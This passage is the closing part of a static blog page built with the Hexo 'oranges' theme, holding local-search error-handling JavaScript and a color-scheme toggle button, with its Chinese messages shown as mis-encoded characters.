            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>æœªæ‰¾åˆ°search.xmlæ–‡ä»¶ï¼Œå…·ä½“è¯·å‚è€ƒï¼š<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>è¯·æ±‚å¤±è´¥ï¼Œå°è¯•é‡æ–°åˆ·æ–°é¡µé¢æˆ–ç¨åé‡è¯•ã€‚<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="../../js/colorscheme.js"></script>





        

      </div>
    </div>
  </body>
</html>
